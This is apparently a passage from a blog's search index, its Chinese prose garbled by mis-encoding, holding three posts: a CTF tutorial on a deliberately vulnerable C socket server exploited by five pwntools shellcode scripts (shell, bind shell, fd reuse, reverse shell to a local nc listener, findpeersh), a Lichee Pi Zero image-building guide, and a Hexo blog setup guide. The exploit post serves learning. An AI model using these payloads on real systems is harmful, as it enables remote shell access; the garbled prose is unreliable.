1.8.2ç‰ˆæœ¬](https://github.com/sudo-project/sudo/releases/tag/SUDO_1_8_2)\n\n[Fedora 16é•œåƒä¸‹è½½](https://archives.fedoraproject.org/pub/archive/fedora/linux/releases/16/Live/x86_64/)\n\n\n\n\n\n# æ¼æ´åˆ©ç”¨\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["æ ¼å¼åŒ–å­—ç¬¦ä¸²"],"categories":["æ¼æ´å¤ç°"]},{"title":"æ·±å…¥ç†è§£pwné¢˜ä¸­çš„æ­£è¿/åè¿tcp","url":"/2021/03/21/reverse-tcp/","content":"\n# ç¼–è¯‘æ¼æ´æºç \n\nä»¥ä¸‹æºç æ¥è‡ª[è€æ¿å¨˜](https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/13/getshell3/) ã€‚é€šè¿‡äº†è§£socketç¼–ç¨‹[ä¸€æ–‡è®©ä½ é€å½»ç†è§£Linuxçš„SOCKETç¼–ç¨‹ï¼ˆå«å®ä¾‹è§£æï¼‰](https://zhuanlan.zhihu.com/p/180556309)ï¼Œå¾ˆæ˜æ˜¾å¯ä»¥çœ‹å‡ºï¼Œè¯¥æœåŠ¡å™¨ç¨‹åºæœ‰ä¸ªæ ˆæº¢å‡ºæ¼æ´ã€‚\n\n```c\n#include<stdio.h>\n#include<unistd.h>\n#include<sys/socket.h>\n#include<arpa/inet.h>\n\nint main(int argc,char **argv){\n    int jmp = 0xe4ff;\n    int sckfd,fd;\n    char buf[10];\n    struct sockaddr_in server;\n    sckfd = socket(AF_INET,SOCK_STREAM,0);\n    server.sin_family = AF_INET;\n    server.sin_port = htons(8888);\n    server.sin_addr.s_addr = inet_addr(\"0.0.0.0\");\n    bind(sckfd,(struct sockaddr *)&server,sizeof(server));\n    listen(sckfd,10);\n    fd = accept(sckfd,NULL,NULL);\n    read(fd,buf,1000);\n\n    return 0;\n}\n```\n\nç¼–è¯‘å‘½ä»¤ï¼š\n\n```bash\ngcc server1.c -fno-stack-protector -no-pie -z execstack -o server1\n```\n\n# äº”ç§getshellçš„æ–¹å¼\n\næˆ‘ä»¬é€šè¿‡pwntoolsæä¾›çš„shellcraftæ¥å®Œæˆæœ¬é¢˜çš„åˆ©ç”¨ã€‚ï¼ˆé€šè¿‡è¯¥æ–¹å¼ç”Ÿæˆçš„shellcodeä¸­å«\"\\x00\"ï¼Œåœ¨çœŸå®ä¸–ç•Œçš„åˆ©ç”¨ä¸­å¦‚é‡åˆ°strcpyè¿™ç§å‡½æ•°ï¼Œå°†åˆ©ç”¨ä¸æˆåŠŸï¼‰\n\n## sh()\n\nexpå¦‚ä¸‹ï¼š\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n\npr = remote('127.0.0.1',8888)\n\npayload = 'a'*30\npayload += p64(0x4006B9)\npayload += asm(shellcraft.sh())\n\npr.sendline(payload)\npr.interactive()\n```\n\næ”»å‡»åï¼Œserver1è¿›ç¨‹å’Œæ”»å‡»è€…è¿›ç¨‹çš„è¿æ¥æƒ…å†µï¼ŒåŠ/proc/self/fdä¸‹çš„æŒ‡å‘å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n\n![](sh.png)\n\nå¯ä»¥çœ‹åˆ°ï¼Œserver1è¿›ç¨‹(PID:18662)ï¼Œå…¶fdçš„0 1 2 éƒ½æ˜¯æŒ‡å‘\"/dev/pts/1\"ï¼Œè¡¨æ˜æ ‡å‡†è¾“å…¥ã€è¾“å‡ºã€é”™è¯¯éƒ½æ˜¯æ‰“å°åˆ°å½“å‰terminalæˆ–è€…ä»å½“å‰terminalè·å–çš„ã€‚\n\næ­¤æ—¶æˆ‘ä»¬åœ¨pythonèµ·çš„terminalä¸­æ˜¯æ— æ³•æ‹¿åˆ°server1è¿›ç¨‹èµ·çš„shellçš„ï¼Œé™¤éæˆ‘ä»¬åœ¨æ‰§è¡Œexecve(\"/bin/sh\")ä¹‹å‰å°†0 1 2 æ›¿æ¢æˆsocketè¿æ¥ï¼Œå°†è¾“å…¥è¾“å‡ºå®šå‘åˆ°socketã€‚è¿™æ˜¯æ¥ä¸‹æ¥å‡ ç§æ–¹æ³•è¦è®²çš„ã€‚\n\n## bindsh() - æ­£è¿\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n\npr = remote('127.0.0.1',8888)\n\npayload = 'a'*30\npayload += p64(0x4006B9)\npayload += asm(shellcraft.bindsh(4444,'ipv4')) \n\npr.sendline(payload)\n\nff = remote('127.0.0.1',4444)   \nff.interactive()\n```\n\nexpæ‰§è¡Œåçš„æƒ…å†µå¦‚ä¸‹ï¼š\n\n![](bindsh.png)\n\nè¿™ä¸ªæ–¹æ³•æ˜¯åœ¨server1ä¸­é€šè¿‡socket()-->bind()-->listen()-->accept()åˆ›å»ºä¸€ä¸ªæ–°çš„socketç›‘å¬ç«¯å£ï¼Œç„¶åæŠŠserver1çš„fdä¸­ 0 1 2å…¨éƒ¨æŒ‡å‘æ–°socketã€‚è¿™æ ·æ¥ä¸‹æ¥æ‰§è¡Œexecve()åï¼Œè¾“å…¥è¾“å‡ºå°±å…¨å®šå‘åˆ°æ–°socketæµä¸­ã€‚æ”»å‡»è¿›ç¨‹ä¸»åŠ¨å‘å—å®³è€…è¿›ç¨‹çš„4444ç«¯å£å‘èµ·è¿æ¥ï¼Œå°±å¯ä»¥æ‹¿åˆ°å—å®³è€…çš„è¾“å…¥è¾“å‡ºï¼Œä»è€Œè·å¾—shellã€‚\n\n## dupsh()\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n\npr = remote('127.0.0.1',8888)\n\npayload = 'a'*30\npayload += p64(0x4006B9)\npayload += asm(shellcraft.dupsh(4))\n\npr.sendline(payload)\npr.interactive()\n```\n\nè¿™ç§æ–¹æ³•å¤ç”¨äº†æ”»å‡»è¿›ç¨‹ä¸server1å»ºç«‹çš„socketè¿æ¥ï¼Œæœ¬é¢˜ä¸­å¯¹äºserver1è¿›ç¨‹æ¥è¯´æ­£å¥½æ˜¯fd=4ã€‚\n\n![](dupsh.png)\n\n## connect()+dupsh() - åè¿\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n\npr = remote('127.0.0.1',8888)\n\npayload = 'a'*30\npayload += p64(0x4006B9)\npayload += asm(shellcraft.connect('127.0.0.1',4444,'ipv4')+shellcraft.dupsh())   \n\npr.sendline(payload)\npr.interactive()\n```\n\nåœ¨æ‰§è¡Œæ”»å‡»ä»£ç å‰ï¼Œéœ€è¦å…ˆå¼€ä¸€ä¸ªterminalï¼Œç”¨ncç›‘å¬4444ç«¯å£ï¼Œç­‰å¾…server1çš„è¿æ¥ï¼š\n\n```bash\nnc -l -p 4444\n```\n\næœ¬æ–¹æ³•æ˜¯åˆ©ç”¨server1ä¸»åŠ¨å»connectæˆ‘ä»¬ç›‘å¬çš„ç«¯å£ï¼Œå»ºç«‹socketè¿æ¥ï¼Œå¹¶ç”¨è¿™ä¸ªsocketå»è¦†ç›–åŸæœ¬çš„ 0 1 2ï¼Œè¾¾åˆ°å°†è¾“å‡ºå®šå‘åˆ°è¿œç«¯çš„ç›®çš„ã€‚\n\n![](connect.png)\n\n## findpeersh()\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n\npr = remote('127.0.0.1',8888)\n\npayload = 'a'*30\npayload += p64(0x4006B9)\npayload += asm(shellcraft.findpeersh(pr.lport))\n\npr.sendline(payload)\npr.interactive()\n```\n\næœ¬æ–¹æ³•æ˜¯åœ¨server1è¿›ç¨‹ä¸­å¯»æ‰¾ä¸`pr.lport`ç«¯å£æœ‰è¿æ¥çš„socketï¼Œå¹¶è¦†ç›–åŸæ¥fdçš„0 1 2ã€‚æ”»å‡»è¿›ç¨‹ä¸­æˆåŠŸæ‹¿åˆ°shellæ—¶çš„è¿æ¥æƒ…å†µå¦‚ä¸‹ï¼š\n\n![](findpeersh.png)\n\n","categories":["CTF"]},{"title":"è”ææ´¾zeroé•œåƒåˆ¶ä½œåŠçƒ§å½•","url":"/2021/03/07/lichee-start/","content":"\n# ç¯å¢ƒå‡†å¤‡\n\nå…³äºè”ææ´¾zeroæ˜¯ä»€ä¹ˆï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹é“¾æ¥å»äº†è§£ã€‚\n\n- [è”ææ´¾Zeroç”¨æˆ·æŒ‡å—](https://licheezero.readthedocs.io/zh/latest/)\n- [è”ææ´¾ç›´æ’­å…¬å¼€è¯¾_è”ææ´¾æ˜¯æ€æ ·ç‚¼æˆçš„](https://www.bilibili.com/video/BV14s41167f3?from=search&seid=9356216417140987538)\n- [å“‡é…·å¼€å‘è€…ç¤¾åŒº - å…¨å¿—V3sè®¨è®ºåŒº](https://whycan.com/f_17.html)\n\nè¿™ç¯‡æ–‡ç« ä¸»è¦è®°å½•ç¬¬ä¸€æ¬¡åœ¨è”ææ´¾zeroä¸Šçƒ§å†™é•œåƒçš„è¿‡ç¨‹ã€‚ä¸‹é¢åˆ—å‡ºçš„æ˜¯æœ¬æ¬¡åšå®éªŒéœ€è¦ç”¨åˆ°çš„ç¡¬ä»¶å’Œå·¥å…·ï¼š\n\n1. æ·˜å®[Sipeedå®˜æ–¹åº—](https://item.taobao.com/item.htm?spm=a1z0d.7625083.1998302264.6.5c5f4e69qdcGhV&id=585033586770)è´­ä¹°lichee pi zeroæ¿å­çš„å…¨å¥—é¤ã€‚ï¼ˆä¹°å…¨å¥—é¤çš„åŸå› æ˜¯ï¼Œæ€•ä¸‡ä¸€åç»­ç¼ºæŸä¸ªç»„ä»¶ä¼šå¾ˆéº»çƒ¦ï¼Œå¹²è„†ä¸€æ¬¡ä¹°å¥½ï¼‰\n2. SDå¡ã€‚ï¼ˆæˆ‘ç”¨çš„16Gçš„ï¼‰\n3. è¯»å¡å™¨ã€‚ï¼ˆå°†é•œåƒå†™å…¥SDå¡ä¸­ï¼‰\n4. usbè½¬ä¸²å£å·¥å…·ã€‚ï¼ˆ[è¿™ç§ç±»å‹çš„](https://detail.tmall.com/item.htm?id=529606571756&spm=a1z09.2.0.0.25f12e8dI4Uhck&_u=7vh1ssgab1b)ï¼‰\n5. å…¬å¯¹æ¯æœé‚¦çº¿ã€‚\n6. è¿˜æœ‰å…¶ä»–åšç¡¬ä»¶å¿…ä¸å¯å°‘çš„å·¥å…·ï¼Œå¦‚ä¸‡ç”¨è¡¨ã€ç”µçƒ™é“ç„Šæ¥å¥—é¤ã€å„ç§å…¬æ¯æœé‚¦çº¿ç­‰ç­‰ã€‚ï¼ˆè™½ç„¶è¿™æ¬¡è¯•éªŒæ²¡æœ‰éƒ½ç”¨ä¸Šï¼Œä½†å¦‚æœå†³å®šå­¦ä¹ åº•å±‚ç¡¬ä»¶åŸç†çš„è¯ï¼Œæ˜¯éœ€è¦éƒ½å‡†å¤‡ä¸Šçš„ï¼‰\n\nä¸‹é¢è¿›å…¥æ­£é¢˜ã€‚\n\né¦–å…ˆï¼Œä½¿ç”¨åˆ«äººåˆ¶ä½œå¥½çš„é•œåƒçƒ§å…¥sdå¡ä¸­ï¼Œæ¥æµ‹è¯•æ¿å­æ˜¯å¦èƒ½æ­£å¸¸ä½¿ç”¨ã€‚\n\nä¹‹åï¼Œå°è¯•è‡ªå·±ç¼–è¯‘ubootã€linux kernelã€æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶å°†å…¶å†™å…¥åˆ°sdä¸­ï¼Œç”¨äºå¯åŠ¨zeroã€‚\n\n# ä½¿ç”¨å®Œæ•´é•œåƒæµ‹è¯•\n\nè¿™ä¸€èŠ‚å‚è€ƒäº†[è”ææ´¾ zero(å…¨å¿—V3S)-ç¼–è¯‘åŠSDçƒ§å½•](https://blog.csdn.net/u012577474/article/details/103494044)è¿™ç¯‡æ–‡ç« çš„ç¬¬ä¸€å°èŠ‚ã€‚\n\nä¸»è¦æ­¥éª¤å¦‚ä¸‹\n\n## çƒ§å½•sdå¡\n\n1. å°†[é•œåƒ](brmin_dd.tar.bz2)ä¸‹è½½åˆ°æœ¬åœ°ï¼Œè§£å‹åå¯ä»¥çœ‹åˆ°`lichee_zero-brmin_alpha.dd`è¿™ä¸ªæ–‡ä»¶ã€‚\n\n2. ä½¿ç”¨[SD Card Formatter](https://www.sdcard.org/downloads/formatter/)å°†sdå¡æ ¼å¼åŒ–ã€‚\n\n3. ä½¿ç”¨[Win32 Disk Imager](https://sourceforge.net/projects/win32diskimager/)å°†ä¸Šè¿°è§£å‹å¾—åˆ°çš„ddæ–‡ä»¶çƒ§å…¥sdå¡ä¸­ã€‚\n\n## å¯åŠ¨zero\n\n1. å°†ä¸Šè¿°çƒ§å¥½çš„SDå¡æ’å…¥zeroçš„sdå¡æ’æ§½ä¸­ã€‚\n\n2. å°†æ˜¾ç¤ºå±é€šè¿‡FPC 40è¿æ¥åˆ°zeroä¸Šï¼Œç”¨äºæŸ¥çœ‹å¯åŠ¨æ—¶çš„è¾“å‡ºã€‚\n\n3. ä½¿ç”¨usb otgç»™zeroä¾›ç”µã€‚è¿™æ—¶å°±å¯ä»¥çœ‹åˆ°å±å¹•ä¸­æ‰“å°å¯åŠ¨logäº†ã€‚\n\nä»¥ä¸Šï¼Œè¯æ˜æˆ‘ä»¬çš„æ¿å­å’Œæ“ä½œæ˜¯æœ¨æœ‰é—®é¢˜çš„ï¼Œä¸‹é¢å°±è®©æˆ‘ä»¬ä»æºç å¼€å§‹æ„å»ºä¸€ä¸ªzeroçš„é•œåƒå§ï¼\n\n# æºç ç¼–è¯‘æ„å»ºé•œåƒ\n\nè¿™èŠ‚å†…å®¹å‚è€ƒäº†[è”ææ´¾å®˜æ–¹æ–‡æ¡£](https://licheezero.readthedocs.io/zh/latest/%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91/uboot_index.html)åŠä»¥ä¸‹ä¸‰ç¯‡æ–‡ç« ï¼Œå†™çš„éƒ½éå¸¸æ£’ï¼\n\n- [è”ææ´¾Zero | å…¨å¿—V3s å¼€å‘æ•™ç¨‹ï¼ˆä¸€ï¼‰](https://blog.csdn.net/qq_40860568/article/details/96474001)\n- [è”ææ´¾Zero V3så¼€å‘æ¿å…¥å‘è®°å½• (TF/SDå¡å¯åŠ¨)(ä¸»çº¿Linux,ä¸»çº¿u-boot)](https://whycan.com/t_561.html)\n- [è”ææ´¾ zero(å…¨å¿—V3S)-ç¼–è¯‘åŠSDçƒ§å½•](https://blog.csdn.net/Jun626/article/details/90082000)\n\n## ç¼–è¯‘uboot\n\nå®‰è£…ä¾èµ–\n\n```shell\nsudo apt install gcc-6-arm-linux-gnueabihf\nsudo apt-get install device-tree-compiler\n```\n\nä¸ºäº†é€‚é…Makefileï¼Œå°†ä»¥ä¸Šå®‰è£…çš„arm-linux-gnueabihf-gcc-6åˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥\n\n```shell\ncd /usr/bin\nsudo ln -s ./arm-linux-gnueabihf-cpp-6 ./arm-linux-gnueabihf-cpp\nsudo ln -s ./arm-linux-gnueabihf-gcc-ar-6 ./arm-linux-gnueabihf-gcc-ar\nsudo ln -s ./arm-linux-gnueabihf-gcc-nm-6 ./arm-linux-gnueabihf-gcc-nm\nsudo ln -s ./arm-linux-gnueabihf-gcc-ranlib-6 ./arm-linux-gnueabihf-gcc-ranlib\nsudo ln -s ./arm-linux-gnueabihf-gcov-6 ./arm-linux-gnueabihf-gcov\nsudo ln -s ./arm-linux-gnueabihf-gcov-dump-6 ./arm-linux-gnueabihf-gcov-dump\nsudo ln -s ./arm-linux-gnueabihf-gcov-tool-6 ./arm-linux-gnueabihf-gcov-tool\n```\n\nä¸‹è½½ubootæºç å¹¶ä¿®æ”¹é…ç½®æ–‡ä»¶sun8i.h\n\n```shell\ngit clone https://github.com/Lichee-Pi/u-boot.git -b v3s-current\ncd u-boot\n# ä¿®æ”¹include/configs/sun8i.hï¼Œä½¿u-bootå¯ä»¥ä»tfå¡å¯åŠ¨ã€‚æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š\n#define CONFIG_BOOTCOMMAND   \"setenv bootm_boot_mode sec; \" \\\n                            \"load mmc 0:1 0x41000000 zImage; \"  \\\n                            \"load mmc 0:1 0x41800000 sun8i-v3s-licheepi-zero-dock.dtb; \" \\\n                            \"bootz 0x41000000 - 0x41800000;\"\n\n#define CONFIG_BOOTARGS      \"console=ttyS0,115200 panic=5 rootwait root=/dev/mmcblk0p2 earlyprintk rw  vt.global_cursor_default=0\"\n```\n\næ”¹å®Œsun8i.håï¼Œæ‰§è¡Œç¼–è¯‘\n\n```shell\nmake ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf- LicheePi_Zero_800x480LCD_defconfig\nmake ARCH=arm menuconfig\ntime make ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf- 2>&1 | tee build.log\n```\n\nç¼–è¯‘å®Œæˆåï¼Œå°†åœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆu-boot-sunxi-with-spl.binã€‚è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶å°†è¢«çƒ§åˆ°8kä½ç½®ç”¨äºå¯åŠ¨ã€‚\n\n## ç¼–è¯‘linux kernel\n\nä¸‹è½½linuxæºç å¹¶ç¼–è¯‘\n\n```shell\ngit clone https://github.com/Lichee-Pi/linux.git\ncd linux\nmake ARCH=arm licheepi_zero_defconfig\nmake ARCH=arm menuconfig \nmake ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf- -j4     # ç¼–è¯‘å†…æ ¸ï¼Œç›®æ ‡æ–‡ä»¶ä¸º./arch/arm/boot/zImage\nmake ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf- dtbs    # ç¼–è¯‘è®¾å¤‡æ ‘ï¼Œç›®æ ‡æ–‡ä»¶ä¸º./arch/arm/boot/dts/sun8i-v3s-licheepi-zero-dock.dtb\n```\n\n## ç¼–è¯‘æ–‡ä»¶ç³»ç»Ÿ\n\nå®‰è£…ä¾èµ–\n\n```shell\nsudo apt-get install linux-headers-$(uname -r)\n```\n\nä¸‹è½½æºç å¹¶ç¼–è¯‘\n\n```shell\nwget https://buildroot.org/downloads/buildroot-2017.08.tar.gz\ntar xvf buildroot-2017.08.tar.gz\ncd buildroot-2017.08/\nmake menuconfig\t\t\t# è¿™é‡Œï¼Œåœ¨menuconfigä¸­éœ€è¦é…ç½®ä¸€äº›å‚æ•°,å¦‚ä¸‹\n## *******ç¬¬ä¸€éƒ¨åˆ†é…ç½®******** ##\n# Target Architecture (ARM(little endian)) --->\n# Target Binary Format (ELF) --->\n# Target Architecture Variant (cortex-A7) --->\n# Target ABI (EABIhf) --->\n# Floating point strategy (VFPv4) --->\n# ARM instruction set (ARM)  --->\n## *******ç¬¬äºŒéƒ¨åˆ†é…ç½®******** ##\n#     Toolchain type (External toolchain) --->\n#     *** Toolchain External Options ***\n#     Toolchain (Linaro ARM 2017.02)\n#     Toolchain origin (Toolchain to be downloaded and installed) --->\n# [ ] Copy gdb server to Target\n#     *** Host GDB Options ***\n# [ ] Build cross gdb for the host\n# [ ] *** Toolchain Generic Options ***\n# [ ] Copy gconv libraries\n# [*] Enable MMU support\n# ( ) Target Optimizations\n# ( ) Target linker options\n# [ ] Register toolchain within Eclipse Buildroot plug-in\n## *******é…ç½®ç»“æŸ******** ##\nmake       # å®Œæˆåä¼šç”Ÿæˆ./output/images/rootfs.tarï¼Œè¿™å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„æ ¹æ–‡ä»¶ç³»ç»Ÿ\n```\n\n## çƒ§å½•SDå¡\n\nå°†ä»¥ä¸Šä¸‰æ­¥ç”Ÿæˆçš„å››ä¸ªæ–‡ä»¶æ‹·è´åˆ°ä¸€å—ï¼Œä¾¿äºè¿›è¡Œåç»­æ­¥éª¤\n\n```shell\nbling@Ubuntu1804:~/lichee/sdcard$ ll\ntotal 9612\ndrwxr-xr-x 2 bling bling    4096 3æœˆ   7 15:46 ./\ndrwxr-xr-x 6 bling bling    4096 3æœˆ   6 22:41 ../\n-rw-r--r-- 1 bling bling 5601280 3æœˆ   6 22:41 rootfs.tar\n-rw-r--r-- 1 bling bling    9262 3æœˆ   6 22:41 sun8i-v3s-licheepi-zero-dock.dtb\n-rw-r--r-- 1 bling bling  398407 3æœˆ   6 22:42 u-boot-sunxi-with-spl.bin\n-rwxr-xr-x 1 bling bling 3813392 3æœˆ   6 22:42 zImage*\n```\n\nå°†SDå¡æ¥å…¥Ubuntuä¸­ï¼Œåœ¨Ubuntuä¸­æ‰“å¼€GPartedåˆ†åŒºç¼–è¾‘å™¨\n\n- åœ¨GPartedç•Œé¢çš„å³ä¸Šè§’å¯ä»¥åˆ‡æ¢ç£ç›˜è®¾å¤‡ï¼Œæˆ‘çš„SDå¡å¯¹åº”çš„æ˜¯/dev/sdbã€‚\n\n- åˆ é™¤SDå¡ä¸Šçš„æ‰€æœ‰åˆ†åŒºï¼Œä½¿ä¹‹æˆä¸ºä¸€ä¸ªæœªåˆ†é…çš„ç£ç›˜ã€‚ï¼ˆè®°å¾—ç‚¹å‡»ä¸Šæ–¹ç»¿è‰²çš„â€œå‹¾â€ï¼Œä½¿æ›´æ”¹ç”Ÿæ•ˆï¼‰\n\n- ç„¶åï¼Œåˆ›å»ºç¬¬ä¸€ä¸ªåˆ†åŒºï¼Œä¸ºFAT16æ ¼å¼\n\n  ![](partition-fat16.png)\n\n- å†ï¼Œåˆ›å»ºç¬¬äºŒä¸ªåˆ†åŒºï¼Œä¸ºEXT4æ ¼å¼\n\n  ![](partition-ext4.png)\n\n- æœ€åï¼Œè®°å¾—ç‚¹å‡»ä¸Šæ–¹ç»¿è‰²çš„â€œå‹¾â€ï¼Œä½¿æ›´æ”¹ç”Ÿæ•ˆï¼ï¼ç„¶åæ‹”æ‰è¯»å¡å™¨ï¼Œå†é‡æ–°æ’åˆ°ç”µè„‘ä¸Šï¼Œå°±å¯ä»¥çœ‹åˆ°fat16å’Œext4åˆ†åˆ«æŒ‚è½½åˆ°äº†/media/bling/ç›®å½•ä¸‹\n\n  ![](partition-finish.png)\n\nåˆ†åŒºå®Œæˆåï¼Œå°±å¯ä»¥å°†ubootï¼Œå†…æ ¸æ–‡ä»¶ï¼Œdtsæ–‡ä»¶ä»¥åŠæ ¹æ–‡ä»¶ç³»ç»Ÿå†™å…¥SDå¡äº†ï¼\n\n```shell\n# 1.ä½¿ç”¨ddå‘½ä»¤å°†ubooté•œåƒå†™åˆ°8kä½ç½®å¤„\nsudo dd if=u-boot-sunxi-with-spl.bin of=/dev/sdb bs=1024 seek=8\n# ç¡®è®¤uboot binæ–‡ä»¶æ˜¯å¦å†™å»å…¥ç£ç›˜ä¸­ï¼Œè¿™æ¡å¯ä¸æ‰§è¡Œ\n# sudo dd bs=1024 count=2000 if=/dev/sdb of=./test1.bin  \n\n# 2.å°†dtbå’ŒzImageæ‹·è´è¿›fat16åˆ†åŒº\ncp sun8i-v3s-licheepi-zero-dock.dtb /media/bling/BOOT/\ncp zImage /media/bling/BOOT/\n\n# 3.å°†æ–‡ä»¶ç³»ç»Ÿrootfs.taræ–‡ä»¶è§£å‹å¹¶æ‹·è´è¿›ext4çš„åˆ†åŒº\nsudo tar xvf rootfs.tar -C /media/bling/rootfs/\n```\n\nè¿™æ ·å°±å®ŒæˆSDå¡çš„åˆ¶ä½œäº†ã€‚\n\n## æŸ¥çœ‹ä¸²å£è¾“å‡º\n\nè®©æˆ‘ä»¬è¯•è¯•è¿™äº›é•œåƒèƒ½ä¸èƒ½æ­£å¸¸è¿è¡Œå§ï¼\n\nè¿˜éœ€è¦åšå‡ ä»¶äº‹æƒ…ï¼š\n\n1. å°†ä¸Šè¿°çƒ§å¥½çš„SDå¡æ’å…¥zeroçš„sdå¡æ’æ§½ä¸­ã€‚\n\n2. åœ¨ç”µè„‘ä¸ŠæŸ¥çœ‹ä¸²å£è¾“å‡ºï¼šéœ€è¦å°†è”ææ´¾çš„UART0 çš„ TX å’Œ RX åˆ†åˆ«è¿æ¥åˆ°â€œusbè½¬ttlå·¥å…·â€çš„ RX å’Œ TXå¤„ï¼Œå¹¶å°†â€œusbè½¬ttlå·¥å…·â€æ¥åœ°ã€‚\n\n   ![](connect-lichee.png)\n\n   ![](connect-usb-ttl.png)\n\n3. ä½¿ç”¨usb otgç»™zeroä¾›ç”µã€‚è¿™æ—¶å°±å¯ä»¥åœ¨ç”µè„‘ç«¯ä¸²å£å·¥å…·ä¸­æŸ¥çœ‹ä¸²å£è¾“å‡ºäº†ã€‚\n\n   ![](connect-whole.png)\n\n4. å¯åŠ¨å®Œæˆåï¼Œä½¿ç”¨rootç™»å½•ç³»ç»Ÿï¼\n\n   ![](success.png)\n\né€šè¿‡ä»¥ä¸Šå®éªŒï¼Œç¡®å®šäº†è‡ªå·±ç¼–è¯‘çš„é•œåƒæ˜¯å¯ä»¥åœ¨è”ææ´¾zeroä¸Šå¯åŠ¨å¹¶è¿è¡Œæ“ä½œç³»ç»Ÿçš„ã€‚æ‰€ä»¥æ¥ä¸‹æ¥çš„è®¡åˆ’æ˜¯ï¼Œæ·±å…¥å­¦ä¹ ubootã€kernelå’Œæ–‡ä»¶ç³»ç»Ÿè¿™ä¸‰ä¸ªéƒ¨åˆ†ï¼Œç†è§£ä»å¯åŠ¨åˆ°ç³»ç»Ÿè¿è¡Œçš„æ¯ä¸€ä¸ªè¿‡ç¨‹å’Œæ¶‰åŠçš„ä¸œè¥¿ã€‚å¸Œæœ›æœ€åèƒ½å®šåˆ¶ä¸€ä¸ªè‡ªå·±çš„ç³»ç»Ÿå‡ºæ¥~\n\n\n\n\n\n\n\n","tags":["åŠ¨æ‰‹å®è·µ"],"categories":["lichee-zero"]},{"title":"å¦‚ä½•ä½¿ç”¨hexo+githubæ­å»ºå±äºè‡ªå·±çš„åšå®¢","url":"/2021/02/16/build-a-blog/","content":"\n\n\n> windowsä¸‹åˆ©ç”¨githubå’Œhexoæ­å»ºåšå®¢\n\n# ç¯å¢ƒä¾èµ–\n\n- [node.js](https://nodejs.org/en/)\n\n- [git](https://git-scm.com/download/win)\n\nåœ¨å®˜ç½‘ä¸­ä¸‹è½½node.jså’Œgitï¼Œå¹¶å®Œæˆå®‰è£…ã€‚\n\nåˆ†åˆ«æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œè‹¥è¿”å›ç‰ˆæœ¬å·ï¼Œåˆ™è¡¨æ˜å®‰è£…æˆåŠŸã€‚\n\n```\ngit --version\nnode --version\n```\n\n# githubä»“åº“\n\n\n\n# è®¾ç½®ssh\n\n```\nssh-keygen -t rsa -C \"xxx@163.com\"\n```\n\nå°†æœ¬åœ°`id_rsa.pub`çš„å†…å®¹ï¼Œæ‹·è´åˆ°githubè®¾ç½®ä¸­çš„`SSH and GPG keys`ã€‚\n\n# å®‰è£…hexo\n\n```shell\nnpm install -g hexo-cli\n```\n\næ–°å»ºä¸€ä¸ªç›®å½•ï¼Œç„¶ååˆå§‹åŒ–è¯¥ç›®å½•\n\n```shell\nmkdir blog\nhexo init blog    # åˆå§‹åŒ–\ncd blog\nnpm install    # å®‰è£…ç»„ä»¶\n```\n\næœ¬åœ°é¢„è§ˆï¼š\n\n```shell\nhexo g    # ç”Ÿæˆé¡µé¢\nhexo s    # å¯åŠ¨é¢„è§ˆ\n# è‹¥é¢„è§ˆç«¯å£è¢«å ç”¨ä½¿ç”¨hexo server -p 5000æ¥æ›´æ”¹ç«¯å£å·\n```\n\næœ¬åœ°åšå®¢æµ‹è¯•æˆåŠŸåï¼Œå°†å…¶ä¸Šä¼ åˆ°githubéƒ¨ç½²\n\n```shell\n# å®‰è£…hexo-deployer-git\nnpm install hexo-deployer-git --save \n# ä¿®æ”¹_config.ymlæ–‡ä»¶æœ«å°¾çš„Deploymentéƒ¨åˆ†ä¸º\ndeploy:\n  type: git\n  repository: git@github.com:ç”¨æˆ·å/ç”¨æˆ·å.github.io.git\n  branch: master\n# ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ä¸Šä¼ åˆ°githubï¼Œå°±å¯ä»¥ä½¿ç”¨https://ç”¨æˆ·å.github.ioè¿›è¡Œè®¿é—®\nhexo d\n```\n\n\n\n# æ–°å»ºåšæ–‡\n\n## è‡ªåŠ¨åˆ›å»º\n\nè¿›å…¥åšå®¢æ‰€åœ¨ç›®å½•ï¼Œå³é”®æ‰“å¼€Git Bash Hereï¼Œåˆ›å»ºåšæ–‡ã€‚åœ¨source/_postsç›®å½•ä¸‹èƒ½çœ‹åˆ°ä¸€ä¸ªMy-New-Post.mdæ–‡ä»¶ã€‚\n\n```shell\nhexo new \"My New Post\"\n```\n\nå°†åšæ–‡ä¸Šä¼ åˆ°githubå¹¶å‘å¸ƒ\n\n```shell\nhexo g # ç”Ÿæˆé¡µé¢\nhexo d # éƒ¨ç½²å‘å¸ƒ\n```\n\n## æ‰‹åŠ¨åˆ›å»º\n\nåœ¨source/_postsç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªmdæ–‡ä»¶ï¼Œå¹¶åœ¨æ–‡ä»¶å¼€å¤´åŠ å…¥å¦‚ä¸‹æ ¼å¼çš„front-matter\n\n```markdown\n---\ntitle: Hello World # æ ‡é¢˜\ndate: 2019/3/26 hh:mm:ss # æ—¶é—´\ncategories: # åˆ†ç±»\n- Diary\ntags: # æ ‡ç­¾\n- PS3\n- Games\n---\n\næ‘˜è¦\n<!--more-->\næ­£æ–‡\n```\n\n# æ›´æ¢ä¸»é¢˜\n\n[hexo themes](https://hexo.io/themes/)\n\n```shell\ncd /f/blog/git clone https://github.com/liuyib/hexo-theme-stun.git themes/stunnpm install --save hexo-renderer-pug    # 